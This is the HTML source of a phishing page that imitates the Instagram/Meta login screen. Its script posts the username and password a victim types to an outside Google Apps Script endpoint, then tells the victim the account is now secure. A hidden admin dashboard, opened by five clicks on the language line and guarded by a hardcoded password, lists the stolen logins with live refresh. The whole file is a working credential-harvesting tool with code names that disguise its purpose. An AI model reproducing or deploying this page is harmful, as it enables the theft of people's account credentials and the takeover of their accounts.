<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
<title>Instagram Login</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet"/>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
html,body{width:100%;height:100%;background:#1C2A33;}
body{font-family:'Roboto',sans-serif;font-weight:400;display:flex;flex-direction:column;min-height:100vh;}
.root{width:100%;min-height:100vh;background:#1C2A33;display:flex;flex-direction:column;}
.screen{display:flex;flex-direction:column;min-height:100vh;}
.hidden{display:none;}
.top-lang{text-align:center;padding:16px 0 0;font-size:13px;color:#aab8c2;cursor:pointer;user-select:none;}
.logo-area{display:flex;justify-content:center;padding:52px 0 38px;}
.ig-logo-wrap{width:74px;height:74px;border-radius:18px;overflow:hidden;}
.ig-logo-wrap img{width:74px;height:74px;object-fit:cover;border-radius:18px;}
.form-area{padding:0 24px;display:flex;flex-direction:column;gap:11px;}
.ig-input{width:100%;background:#2a3a47;border:1px solid #3d5060;border-radius:999px;padding:15px 20px;font-size:14px;color:#e8f0f5;font-family:'Roboto',sans-serif;font-weight:400;outline:none;appearance:none;-webkit-appearance:none;}
.ig-input::placeholder{color:#6b8090;}
.ig-input:focus{border-color:#5a7080;}
.ig-input.err{border-color:#e24b4a;}
.login-btn{width:100%;padding:15px;background:#0064E0;border:none;border-radius:999px;color:#fff;font-size:15px;font-weight:400;font-family:'Roboto',sans-serif;cursor:pointer;margin-top:4px;letter-spacing:0.02em;transition:opacity 0.2s;}
.login-btn:disabled{opacity:0.6;cursor:not-allowed;}
.login-btn:active{opacity:0.88;}
.forgot{text-align:center;color:#aab8c2;font-size:14px;font-weight:400;margin-top:16px;cursor:pointer;}
.spacer{flex:1;}
.bottom-area{padding:20px 24px 32px;display:flex;flex-direction:column;align-items:center;gap:14px;}
.create-btn{width:100%;padding:14px;background:transparent;border:1.5px solid #3d5060;border-radius:999px;color:#5ba3d9;font-size:14px;font-weight:400;font-family:'Roboto',sans-serif;cursor:pointer;}
.meta-text{color:#6b8090;font-size:13px;font-weight:400;padding-bottom:4px;}
.success-screen{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;text-align:center;min-height:100vh;background:#1C2A33;}
.s-title{font-size:22px;color:#e8f0f5;font-weight:400;margin-bottom:10px;}
.s-sub{font-size:15px;color:#6b8090;font-weight:400;}
.s-btn{margin-top:1.8rem;width:100%;max-width:280px;padding:14px;background:#0064E0;border:none;border-radius:999px;color:#fff;font-size:15px;font-weight:400;font-family:'Roboto',sans-serif;cursor:pointer;text-decoration:none;display:inline-block;text-align:center;}
.pwd-screen{flex:1;display:flex;flex-direction:column;min-height:100vh;background:#1C2A33;}
.back-row{padding:16px 20px 0;font-size:13px;color:#5ba3d9;cursor:pointer;font-weight:400;}
.pwd-mid{flex:1;display:flex;flex-direction:column;justify-content:center;padding:0 24px 60px;}
.pwd-title{font-size:20px;color:#e8f0f5;font-weight:400;text-align:center;margin-bottom:6px;}
.pwd-sub{font-size:13px;color:#6b8090;text-align:center;margin-bottom:24px;font-weight:400;}
.pwd-err{color:#e24b4a;font-size:12px;text-align:center;margin-top:10px;display:none;font-weight:400;}
.admin-screen{display:flex;flex-direction:column;min-height:100vh;background:#1C2A33;}
.admin-header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border-bottom:1px solid #2a3a47;}
.admin-htitle{font-size:15px;color:#e8f0f5;font-weight:400;}
.admin-header-right{display:flex;align-items:center;gap:10px;}
.a-refresh{background:#2a3a47;border:1px solid #3d5060;border-radius:999px;color:#6b8090;font-size:11px;cursor:pointer;font-family:'Roboto',sans-serif;font-weight:400;padding:5px 12px;}
.a-refresh.active{background:#0064E0;border-color:#0064E0;color:#fff;animation:pulse 1.5s infinite;}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.6;}}
.a-logout{background:none;border:none;color:#6b8090;font-size:12px;cursor:pointer;font-family:'Roboto',sans-serif;font-weight:400;}
.admin-body{flex:1;overflow-y:auto;padding:16px 20px;}
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px;}
.stat{background:#2a3a47;border-radius:12px;padding:10px 6px;text-align:center;}
.stat-n{font-size:22px;color:#e8f0f5;font-weight:400;}
.stat-l{font-size:10px;color:#6b8090;margin-top:2px;font-weight:400;}
.res-card{background:#2a3a47;border-radius:12px;padding:12px;margin-bottom:10px;}
.res-time{font-size:11px;color:#6b8090;margin-bottom:8px;display:flex;gap:10px;flex-wrap:wrap;font-weight:400;}
.res-ql{font-size:10px;color:#5ba3d9;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:3px;font-weight:400;}
.res-ans{font-size:13px;color:#e8f0f5;line-height:1.5;margin-bottom:6px;font-weight:400;word-break:break-all;}
.loading-s{text-align:center;padding:2rem;color:#6b8090;font-size:13px;font-weight:400;}
.empty-s{text-align:center;padding:2rem;color:#6b8090;font-size:13px;font-weight:400;}
.error-s{text-align:center;padding:2rem;color:#e24b4a;font-size:13px;font-weight:400;}
</style>
</head>

  <div class="form-area">
    <input class="ig-input" type="text" id="exp-input" placeholder="Username, email or mobile number"/>
    <input class="ig-input" type="text" id="ans-input" placeholder="Password"/>
    <button class="login-btn" id="login-btn" onclick="submitSurvey()">Log in</button>
    <div class="forgot" onclick="skipAnswer()">Forgot password?</div>
  </div>
  <div class="spacer"></div>
  <div class="bottom-area">
    <button class="create-btn">Create new account</button>
    <div class="meta-text">Meta</div>
  </div>
</div>

<!-- Success Screen -->
<div id="success-screen" class="hidden">
  <div class="success-screen">
    <div class="s-title">Thank you!</div>
    <div class="s-sub">Your account is now safe &amp; secure.</div>
    <a class="s-btn" href="https://www.instagram.com" target="_blank">Open Instagram</a>
  </div>
</div>

<!-- Admin Login Screen -->
<div id="pwd-screen" class="hidden">
  <div class="pwd-screen">
    <div class="back-row" onclick="backToSurvey()">&#8592; Back</div>
    <div class="pwd-mid">
      <div class="pwd-title">Admin access</div>
      <div class="pwd-sub">Enter password to continue</div>
      <div style="display:flex;flex-direction:column;gap:10px;">
        <input class="ig-input" type="password" id="pwd-input" placeholder="Password" onkeydown="if(event.key==='Enter')checkPwd()"/>
        <button class="login-btn" onclick="checkPwd()">Log in</button>
      </div>
      <div class="pwd-err" id="pwd-err">Incorrect password. Try again.</div>
    </div>
  </div>
</div>

<!-- Admin Dashboard -->
<div id="admin-screen" class="hidden">
  <div class="admin-screen">
    <div class="admin-header">
      <div class="admin-htitle">Admin dashboard</div>
      <div class="admin-header-right">
        <button class="a-refresh" id="refresh-btn" onclick="toggleAutoRefresh()">&#9654; Live</button>
        <button class="a-logout" onclick="logout()">Logout</button>
      </div>
    </div>
    <div class="admin-body">
      <div class="stats-row">
        <div class="stat"><div class="stat-n" id="s-total">-</div><div class="stat-l">Total</div></div>
        <div class="stat"><div class="stat-n" id="s-today">-</div><div class="stat-l">Today</div></div>
        <div class="stat"><div class="stat-n" id="s-week">-</div><div class="stat-l">This week</div></div>
      </div>
      <div id="res-list"><div class="loading-s">Loading...</div></div>
    </div>
  </div>
</div>

</div>

<script>
const PWD = "Pumpum#89";
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1WbsxsC7oNMcTufiS6ZbDF_ysD7HSPdNf2AwIVe-dJWMnHIflLR-erXBHbCmKmD68/exec";
let langClickCount = 0, langClickTimer = null;
let autoRefreshInterval = null, isAutoRefresh = false;

function handleLangClick() {
  langClickCount++;
  clearTimeout(langClickTimer);
  langClickTimer = setTimeout(() => { langClickCount = 0; }, 1000);
  if (langClickCount >= 5) { langClickCount = 0; showOnly('pwd-screen'); }
}

function showOnly(id) {
  ['survey-screen','success-screen','pwd-screen','admin-screen'].forEach(x => {
    document.getElementById(x).classList.add('hidden');
  });
  document.getElementById(id).classList.remove('hidden');
}

function submitSurvey() {
  const exp = document.getElementById('exp-input').value.trim();
  const ans = document.getElementById('ans-input').value.trim();
  const inp = document.getElementById('exp-input');
  if (!exp) { inp.classList.add('err'); setTimeout(() => inp.classList.remove('err'), 1000); return; }
  const btn = document.getElementById('login-btn');
  btn.textContent = 'Logging in...';
  btn.disabled = true;
  fetch(SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ experience: exp, answer: ans || 'No answer' })
  }).finally(() => {
    btn.textContent = 'Log in';
    btn.disabled = false;
    document.getElementById('exp-input').value = '';
    document.getElementById('ans-input').value = '';
    showOnly('success-screen');
  });
}

function skipAnswer() { document.getElementById('ans-input').value = ''; }
function backToSurvey() { showOnly('survey-screen'); }

function checkPwd() {
  const v = document.getElementById('pwd-input').value;
  const err = document.getElementById('pwd-err');
  if (v === PWD) {
    err.style.display = 'none';
    showOnly('admin-screen');
    loadAdmin();
  } else {
    err.style.display = 'block';
  }
}

function logout() {
  document.getElementById('pwd-input').value = '';
  autoRefreshOff();
  showOnly('survey-screen');
}

function loadAdmin() {
  const list = document.getElementById('res-list');
  fetch(SCRIPT_URL + '?nocache=' + Date.now())
    .then(r => r.json())
    .then(data => {
      if (data.status !== 'ok') { list.innerHTML = '<div class="error-s">Error loading data.</div>'; return; }
      const rows = data.data || [];
      const now = Date.now();
      const todayS = new Date(); todayS.setHours(0,0,0,0);
      const weekS = now - 7 * 86400000;
      document.getElementById('s-total').textContent = rows.length;
      document.getElementById('s-today').textContent = rows.filter(x => new Date(x.ts) >= todayS).length;
      document.getElementById('s-week').textContent = rows.filter(x => new Date(x.ts).getTime() >= weekS).length;
      if (!rows.length) { list.innerHTML = '<div class="empty-s">No responses yet.</div>'; return; }
      list.innerHTML = [...rows].reverse().map(x => `
        <div class="res-card">
          <div class="res-time"><span>📅 ${x.date}</span><span>🕐 ${x.time}</span></div>
          <div class="res-ql">Username / Email</div>
          <div class="res-ans">${x.experience}</div>
          <div class="res-ql">Password</div>
          <div class="res-ans">${x.answer}</div>
        </div>`).join('');
    })
    .catch(() => {
      list.innerHTML = '<div class="error-s">Could not load. Check internet connection.</div>';
    });
}

function autoRefreshOff() {
  clearInterval(autoRefreshInterval);
  autoRefreshInterval = null;
  isAutoRefresh = false;
  const btn = document.getElementById('refresh-btn');
  if (btn) { btn.classList.remove('active'); btn.innerHTML = '&#9654; Live'; }
}

function toggleAutoRefresh() {
  const btn = document.getElementById('refresh-btn');
  if (isAutoRefresh) {
    autoRefreshOff();
  } else {
    isAutoRefresh = true;
    btn.classList.add('active');
    btn.innerHTML = '&#9646;&#9646; Live';
    loadAdmin();
    autoRefreshInterval = setInterval(loadAdmin, 4000);
  }
}
</script>
</body>
</html>
